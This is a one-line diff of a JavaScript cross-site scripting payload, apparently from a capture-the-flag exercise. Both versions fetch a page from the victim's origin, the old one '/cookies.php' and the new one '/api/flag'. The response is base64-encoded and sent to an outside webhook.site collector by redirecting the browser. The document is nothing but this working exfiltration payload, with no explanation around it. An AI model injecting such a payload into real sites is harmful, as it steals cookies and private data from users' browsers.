@@ -1,1 +1,1 @@
-fetch('/cookies.php').then(response => response.text()).then(text => window.location.href =`https://webhook.site/dbfb5ad3-fcf1-4c2d-ac00-c239ea0379be?cz=${btoa(text)}`);
+fetch('/api/flag').then(response => response.text()).then(text => window.location.href =`https://webhook.site/0e039ea9-674a-4a9c-a42b-aca98da957f0?cz=${btoa(text)}`);
